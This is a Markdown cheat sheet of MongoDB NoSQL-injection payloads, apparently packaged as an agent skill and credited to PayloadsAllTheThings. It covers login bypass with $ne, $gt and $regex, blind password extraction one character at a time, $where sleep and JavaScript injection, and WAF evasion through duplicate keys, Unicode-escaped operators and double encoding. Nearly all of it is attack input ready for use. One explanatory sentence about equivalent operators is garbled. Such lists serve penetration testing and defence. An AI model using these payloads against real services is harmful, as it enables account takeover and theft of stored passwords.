---
description: MongoDB operators ($gt, $ne, $regex, $where), auth bypass, blind extraction
skill: nosql-injection
source: PayloadsAllTheThings — NoSQL Injection
source_revision: 3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a
source_license: MIT; see THIRD_PARTY_NOTICES.md
---

# NoSQL Injection Payloads

> Source: PayloadsAllTheThings — NoSQL Injection

## MongoDB Operator Injection

### URL-Encoded (GET/POST Parameters)

```
username[$ne]=x&password[$ne]=x
username[$gt]=&password[$gt]=
username[$exists]=true&password[$exists]=true
login[$regex]=.*&pass[$ne]=x
login[$regex]=^admin&pass[$ne]=x
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
username[$nin][0]=x&password[$nin][0]=x
```

### JSON Body (POST)

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$exists": true}, "password": {"$exists": true}}
{"username": "admin", "password": {"$ne": "wrongpassword"}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": {"$in": ["admin", "root"]}, "password": {"$ne": ""}}
```

## Data Extraction via $regex

### Password Length Detection

```json
{"username": "admin", "password": {"$regex": ".{1}"}}
{"username": "admin", "password": {"$regex": ".{5}"}}
{"username": "admin", "password": {"$regex": ".{10}"}}
```

Increment length until response changes.

### Character-by-Character Extraction

```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^abc"}}
```

## Blind NoSQL Injection

### Time-Based (via $where)

```json
{"username": "admin", "$where": "sleep(5000)"}
{"$where": "this.username == 'admin' && sleep(5000)"}
```

## Server-Side JavaScript Injection ($where)

```json
{"$where": "return true"}
{"$where": "1==1"}
{"$where": "this.password.match(/.*/)"}
```

Data exfiltration via `$where` (MongoDB < 4.2, sandboxed JS — no filesystem/RCE):
```json
{"$where": "function(){return this.username == tojsononeline(this)}"}
```

Note: server-side JavaScript (`$where`, `$function`, `$accumulator`) is enabled by default; it is
deprecated in MongoDB 8.0 and off only where `security.javascriptEnabled: false` (or `--noscripting`)
is set. It runs with no `require()`, filesystem or network access: it enables data exfiltration and
timing oracles, not RCE.

## Other Operators

### $exists — Field Enumeration

```json
{"field_name": {"$exists": true}}
{"secret_field": {"$exists": true}, "password": {"$ne": ""}}
```

### $type — Type Confusion

```json
{"password": {"$type": 2}}
```

Type 2 = string, can bypass type checks.

## WAF Bypass Techniques

### Duplicate Keys (Last Key Wins)

```json
{"id": "safe_value", "id": {"$ne": ""}}
```

### Unicode Encoded Operators

```json
{"username": {"\u0024\u006e\u0065": ""}}
```

### Array Injection

```
username=admin&password[$ne]=&password[$ne]=x
```

### Equivalent operators and encodings

- `{"$not": {"$eq": "wrong"}}` and `{"$nin": []}` behave like `$ne` with names filters key on less.
- `%2524ne` passes single-decode WAFs.
- A JSON body sent with a form `Content-Type` slips past WAFs that inspect only the declared type.
